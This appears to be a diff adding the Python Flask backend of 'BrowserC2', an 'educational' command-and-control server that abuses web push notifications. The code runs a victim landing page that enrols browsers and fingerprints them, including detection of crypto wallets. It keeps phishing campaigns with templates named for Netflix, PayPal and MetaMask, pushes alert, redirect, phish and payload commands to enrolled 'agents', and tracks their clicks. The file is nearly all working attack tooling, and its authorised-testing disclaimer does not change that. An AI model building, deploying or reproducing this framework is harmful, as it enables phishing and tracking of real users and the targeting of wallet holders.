@@ -1,0 +1,526 @@
+#!/usr/bin/env python3
+"""
+BrowserC2 - Educational Browser-Based Command & Control Framework
+Author: Hackin' with PJ131
+Purpose: Security research and red team education
+
+WARNING: For authorized testing only. Unauthorized use is illegal.
+"""
+
+from flask import Flask, render_template, request, jsonify, redirect, url_for
+from flask_sqlalchemy import SQLAlchemy
+from flask_cors import CORS
+from datetime import datetime, timedelta
+import json
+import os
+from pywebpush import webpush, WebPushException
+from py_vapid import Vapid01 as Vapid
+import base64
+import hashlib
+import secrets
+
+# Initialize Flask app
+app = Flask(__name__)
+app.config['SECRET_KEY'] = secrets.token_hex(32)
+app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///browserc2.db'
+app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+
+# Initialize extensions
+db = SQLAlchemy(app)
+CORS(app)
+
+# VAPID keys for Web Push (generate on first run)
+VAPID_PRIVATE_KEY = None
+VAPID_PUBLIC_KEY = None
+VAPID_CLAIMS = {
+    "sub": "mailto:admin@browserc2.local"
+}
+
+def init_vapid_keys():
+    """Initialize or load VAPID keys for Web Push"""
+    global VAPID_PRIVATE_KEY, VAPID_PUBLIC_KEY
+    
+    private_key_file = 'private_key.pem'
+    public_key_file = 'public_key.pem'
+    
+    if os.path.exists(private_key_file) and os.path.exists(public_key_file):
+        # Load existing keys
+        VAPID_PRIVATE_KEY = open(private_key_file, 'r').read()
+        VAPID_PUBLIC_KEY = open(public_key_file, 'r').read().strip()
+    else:
+        # Generate new VAPID keys
+        vapid = Vapid()
+        vapid.generate_keys()
+        
+        # Save private key
+        with open(private_key_file, 'w') as f:
+            f.write(vapid.private_pem().decode('utf-8'))
+        
+        # Save public key
+        vapid.save_public_key(public_key_file)
+        
+        VAPID_PRIVATE_KEY = vapid.private_pem().decode('utf-8')
+        
+        # Read the saved public key
+        with open(public_key_file, 'r') as f:
+            VAPID_PUBLIC_KEY = f.read().strip()
+        
+        print(f"[+] Generated new VAPID keys")
+    
+    print(f"[+] VAPID Public Key loaded")
+
+
+# ============= DATABASE MODELS =============
+
+class Agent(db.Model):
+    """Represents an enrolled browser (victim)"""
+    __tablename__ = 'agents'
+    
+    id = db.Column(db.Integer, primary_key=True)
+    agent_id = db.Column(db.String(64), unique=True, nullable=False)
+    subscription = db.Column(db.Text, nullable=False)  # Web Push subscription JSON
+    
+    # Fingerprinting data
+    user_agent = db.Column(db.String(512))
+    ip_address = db.Column(db.String(45))
+    browser = db.Column(db.String(100))
+    os = db.Column(db.String(100))
+    screen_resolution = db.Column(db.String(50))
+    timezone = db.Column(db.String(100))
+    language = db.Column(db.String(50))
+    has_crypto_wallet = db.Column(db.Boolean, default=False)
+    
+    # Tracking
+    first_seen = db.Column(db.DateTime, default=datetime.utcnow)
+    last_seen = db.Column(db.DateTime, default=datetime.utcnow)
+    is_active = db.Column(db.Boolean, default=True)
+    
+    # Relationships
+    commands = db.relationship('Command', backref='agent', lazy=True, cascade='all, delete-orphan')
+    clicks = db.relationship('Click', backref='agent', lazy=True, cascade='all, delete-orphan')
+    
+    def to_dict(self):
+        return {
+            'id': self.id,
+            'agent_id': self.agent_id,
+            'user_agent': self.user_agent,
+            'ip_address': self.ip_address,
+            'browser': self.browser,
+            'os': self.os,
+            'screen_resolution': self.screen_resolution,
+            'timezone': self.timezone,
+            'language': self.language,
+            'has_crypto_wallet': self.has_crypto_wallet,
+            'first_seen': self.first_seen.isoformat() if self.first_seen else None,
+            'last_seen': self.last_seen.isoformat() if self.last_seen else None,
+            'is_active': self.is_active,
+            'command_count': len(self.commands),
+            'click_count': len(self.clicks)
+        }
+
+
+class Campaign(db.Model):
+    """C2 campaign for organizing operations"""
+    __tablename__ = 'campaigns'
+    
+    id = db.Column(db.Integer, primary_key=True)
+    name = db.Column(db.String(200), nullable=False)
+    description = db.Column(db.Text)
+    template = db.Column(db.String(100))  # e.g., 'netflix', 'paypal', 'metamask'
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+    is_active = db.Column(db.Boolean, default=True)
+    
+    # Relationships
+    commands = db.relationship('Command', backref='campaign', lazy=True)
+    
+    def to_dict(self):
+        return {
+            'id': self.id,
+            'name': self.name,
+            'description': self.description,
+            'template': self.template,
+            'created_at': self.created_at.isoformat() if self.created_at else None,
+            'is_active': self.is_active,
+            'command_count': len(self.commands)
+        }
+
+
+class Command(db.Model):
+    """Commands sent to agents via push notifications"""
+    __tablename__ = 'commands'
+    
+    id = db.Column(db.Integer, primary_key=True)
+    agent_id = db.Column(db.Integer, db.ForeignKey('agents.id'), nullable=False)
+    campaign_id = db.Column(db.Integer, db.ForeignKey('campaigns.id'), nullable=True)
+    
+    command_type = db.Column(db.String(50), nullable=False)  # 'alert', 'redirect', 'phish', 'payload'
+    title = db.Column(db.String(200))
+    message = db.Column(db.Text)
+    url = db.Column(db.String(500))
+    icon = db.Column(db.String(500))
+    
+    sent_at = db.Column(db.DateTime, default=datetime.utcnow)
+    delivered = db.Column(db.Boolean, default=False)
+    clicked = db.Column(db.Boolean, default=False)
+    
+    def to_dict(self):
+        return {
+            'id': self.id,
+            'agent_id': self.agent_id,
+            'campaign_id': self.campaign_id,
+            'command_type': self.command_type,
+            'title': self.title,
+            'message': self.message,
+            'url': self.url,
+            'sent_at': self.sent_at.isoformat() if self.sent_at else None,
+            'delivered': self.delivered,
+            'clicked': self.clicked
+        }
+
+
+class Click(db.Model):
+    """Track notification clicks for analytics"""
+    __tablename__ = 'clicks'
+    
+    id = db.Column(db.Integer, primary_key=True)
+    agent_id = db.Column(db.Integer, db.ForeignKey('agents.id'), nullable=False)
+    command_id = db.Column(db.Integer, db.ForeignKey('commands.id'), nullable=True)
+    
+    clicked_at = db.Column(db.DateTime, default=datetime.utcnow)
+    ip_address = db.Column(db.String(45))
+    user_agent = db.Column(db.String(512))
+
+
+# ============= ROUTES =============
+
+@app.route('/')
+def index():
+    """Victim-facing landing page (enrollment)"""
+    return render_template('victim.html', vapid_public_key=VAPID_PUBLIC_KEY)
+
+
+@app.route('/c2')
+def dashboard():
+    """C2 operator dashboard"""
+    return render_template('dashboard.html')
+
+@app.route('/sw.js')
+def service_worker():
+    """Serve service worker from root for proper scope"""
+    from flask import send_from_directory
+    return send_from_directory('.', 'sw.js', mimetype='application/javascript')
+
+@app.route('/api/enroll', methods=['POST'])
+def enroll_agent():
+    """Enroll a new agent (browser subscription)"""
+    try:
+        data = request.json
+        subscription = data.get('subscription')
+        fingerprint = data.get('fingerprint', {})
+        
+        if not subscription:
+            return jsonify({'error': 'No subscription provided'}), 400
+        
+        # Generate unique agent ID
+        agent_id = hashlib.sha256(
+            json.dumps(subscription, sort_keys=True).encode()
+        ).hexdigest()[:16]
+        
+        # Check if agent already exists
+        agent = Agent.query.filter_by(agent_id=agent_id).first()
+        
+        if agent:
+            # Update existing agent
+            agent.last_seen = datetime.utcnow()
+            agent.is_active = True
+            agent.subscription = json.dumps(subscription)
+        else:
+            # Create new agent
+            agent = Agent(
+                agent_id=agent_id,
+                subscription=json.dumps(subscription),
+                user_agent=request.headers.get('User-Agent'),
+                ip_address=request.remote_addr,
+                browser=fingerprint.get('browser'),
+                os=fingerprint.get('os'),
+                screen_resolution=fingerprint.get('screen'),
+                timezone=fingerprint.get('timezone'),
+                language=fingerprint.get('language'),
+                has_crypto_wallet=fingerprint.get('hasCryptoWallet', False)
+            )
+            db.session.add(agent)
+        
+        db.session.commit()
+        
+        print(f"[+] Agent enrolled: {agent_id} ({agent.browser} on {agent.os})")
+        
+        return jsonify({
+            'success': True,
+            'agent_id': agent_id,
+            'message': 'Notifications enabled successfully'
+        })
+        
+    except Exception as e:
+        print(f"[-] Enrollment error: {str(e)}")
+        return jsonify({'error': str(e)}), 500
+
+
+@app.route('/api/agents', methods=['GET'])
+def get_agents():
+    """Get all enrolled agents"""
+    agents = Agent.query.order_by(Agent.last_seen.desc()).all()
+    return jsonify([agent.to_dict() for agent in agents])
+
+
+@app.route('/api/agents/<int:agent_id>', methods=['GET'])
+def get_agent(agent_id):
+    """Get specific agent details"""
+    agent = Agent.query.get_or_404(agent_id)
+    return jsonify(agent.to_dict())
+
+
+@app.route('/api/campaigns', methods=['GET', 'POST'])
+def campaigns():
+    """Manage campaigns"""
+    if request.method == 'GET':
+        campaigns = Campaign.query.order_by(Campaign.created_at.desc()).all()
+        return jsonify([c.to_dict() for c in campaigns])
+    
+    elif request.method == 'POST':
+        data = request.json
+        campaign = Campaign(
+            name=data.get('name'),
+            description=data.get('description'),
+            template=data.get('template')
+        )
+        db.session.add(campaign)
+        db.session.commit()
+        
+        return jsonify(campaign.to_dict()), 201
+
+@app.route('/api/agents/<int:agent_id>', methods=['DELETE'])
+def delete_agent(agent_id):
+    """Delete/kill an agent"""
+    try:
+        agent = Agent.query.get(agent_id)
+        if not agent:
+            return jsonify({'error': 'Agent not found'}), 404
+        
+        agent_info = f"{agent.agent_id} ({agent.browser} on {agent.os})"
+        
+        # Delete agent (cascade will delete commands and clicks)
+        db.session.delete(agent)
+        db.session.commit()
+        
+        print(f"[+] Agent deleted: {agent_info}")
+        
+        return jsonify({
+            'success': True,
+            'message': f'Agent {agent_info} deleted'
+        })
+        
+    except Exception as e:
+        print(f"[-] Delete agent error: {str(e)}")
+        return jsonify({'error': str(e)}), 500
+@app.route('/api/send_notification', methods=['POST'])
+
+def send_notification():
+    """Send push notification to agent(s)"""
+    try:
+        data = request.json
+        agent_ids = data.get('agent_ids', [])  # List of agent IDs
+        campaign_id = data.get('campaign_id')
+        command_type = data.get('type', 'alert')
+        title = data.get('title', 'Security Alert')
+        message = data.get('message', 'Action required')
+        url = data.get('url', '')
+        icon = data.get('icon', '/static/img/icon.png')
+        
+        results = []
+        
+        # Send to all specified agents
+        for agent_id in agent_ids:
+            agent = Agent.query.get(agent_id)
+            if not agent:
+                continue
+            
+            # Create command record
+            command = Command(
+                agent_id=agent.id,
+                campaign_id=campaign_id,
+                command_type=command_type,
+                title=title,
+                message=message,
+                url=url,
+                icon=icon
+            )
+            db.session.add(command)
+            db.session.flush()
+            
+            # Parse subscription
+            subscription_info = json.loads(agent.subscription)
+            
+            # Create notification payload
+            notification_payload = {
+                'title': title,
+                'body': message,
+                'icon': icon,
+                'data': {
+                    'url': url,
+                    'command_id': command.id,
+                    'agent_id': agent.agent_id
+                }
+            }
+            
+            # Send push notification
+            try:
+                webpush(
+                    subscription_info=subscription_info,
+                    data=json.dumps(notification_payload),
+                    vapid_private_key='./private_key.pem',
+                    vapid_claims=VAPID_CLAIMS
+                )
+                
+                command.delivered = True
+                results.append({
+                    'agent_id': agent.id,
+                    'status': 'sent',
+                    'agent_name': f"{agent.browser} on {agent.os}"
+                })
+                
+                print(f"[+] Notification sent to agent {agent.agent_id}")
+                
+            except WebPushException as e:
+                print(f"[-] Push failed for agent {agent.agent_id}: {e}")
+                results.append({
+                    'agent_id': agent.id,
+                    'status': 'failed',
+                    'error': str(e)
+                })
+        
+        db.session.commit()
+        
+        return jsonify({
+            'success': True,
+            'results': results,
+            'total_sent': len([r for r in results if r['status'] == 'sent'])
+        })
+        
+    except Exception as e:
+        print(f"[-] Send notification error: {str(e)}")
+        return jsonify({'error': str(e)}), 500
+
+
+@app.route('/api/click/<agent_id>', methods=['POST'])
+def track_click(agent_id):
+    """Track when agent clicks notification"""
+    try:
+        data = request.json
+        command_id = data.get('command_id')
+        print(f"[DEBUG] Click tracking - Agent: {agent_id}, Command ID: {command_id}")
+
+        agent = Agent.query.filter_by(agent_id=agent_id).first()
+        if not agent:
+            return jsonify({'error': 'Agent not found'}), 404
+        
+        # Update last seen
+        agent.last_seen = datetime.utcnow()
+        
+        # Record click
+        click = Click(
+            agent_id=agent.id,
+            command_id=command_id,
+            ip_address=request.remote_addr,
+            user_agent=request.headers.get('User-Agent')
+        )
+        db.session.add(click)
+        
+        # Mark command as clicked
+        if command_id:
+            command = Command.query.get(command_id)
+            if command:
+                command.clicked = True
+                print(f"[DEBUG] Command {command_id} marked as clicked")
+            else:
+                print(f"[DEBUG] Command {command_id} not found!")
+        else:
+            print(f"[DEBUG] No command_id provided")
+        
+        db.session.commit()
+        
+        print(f"[+] Click tracked for agent {agent_id}")
+        
+        return jsonify({'success': True})
+        
+    except Exception as e:
+        print(f"[-] Click tracking error: {str(e)}")
+        return jsonify({'error': str(e)}), 500
+
+
+@app.route('/api/stats', methods=['GET'])
+def get_stats():
+    """Get C2 statistics"""
+    total_agents = Agent.query.count()
+    active_agents = Agent.query.filter_by(is_active=True).count()
+    total_campaigns = Campaign.query.count()
+    total_commands = Command.query.count()
+    delivered_commands = Command.query.filter_by(delivered=True).count()
+    clicked_commands = Command.query.filter_by(clicked=True).count()
+    
+    # Calculate delivery and click rates
+    delivery_rate = (delivered_commands / total_commands * 100) if total_commands > 0 else 0
+    click_rate = (clicked_commands / delivered_commands * 100) if delivered_commands > 0 else 0
+    
+    return jsonify({
+        'total_agents': total_agents,
+        'active_agents': active_agents,
+        'total_campaigns': total_campaigns,
+        'total_commands': total_commands,
+        'delivered_commands': delivered_commands,
+        'clicked_commands': clicked_commands,
+        'delivery_rate': round(delivery_rate, 1),
+        'click_rate': round(click_rate, 1)
+    })
+
+
+@app.route('/api/commands', methods=['GET'])
+def get_commands():
+    """Get all commands"""
+    commands = Command.query.order_by(Command.sent_at.desc()).limit(100).all()
+    return jsonify([cmd.to_dict() for cmd in commands])
+
+
+# ============= INITIALIZATION =============
+
+def init_db():
+    """Initialize database"""
+    with app.app_context():
+        db.create_all()
+        print("[+] Database initialized")
+
+
+if __name__ == '__main__':
+    print("""
+    ╔══════════════════════════════════════════════════════════╗
+    ║            BrowserC2 - Educational Framework             ║
+    ║                                                          ║
+    ║     ⚠️  FOR AUTHORIZED TESTING ONLY  ⚠️                   ║
+    ║                                                          ║
+    ║   Author: Hackin' with PJ131                             ║
+    ║   Purpose: Security Research & Red Team Education        ║
+    ╚══════════════════════════════════════════════════════════╝
+    """)
+    
+    # Initialize VAPID keys
+    init_vapid_keys()
+    
+    # Initialize database
+    init_db()
+    
+    print("\n[+] Starting BrowserC2 server...")
+    print("[+] C2 Dashboard: http://localhost:5000/c2")
+    print("[+] Victim Page: http://localhost:5000/")
+    print("\n")
+    
+    # Run Flask server
+    app.run(host='0.0.0.0', port=5000, debug=True)
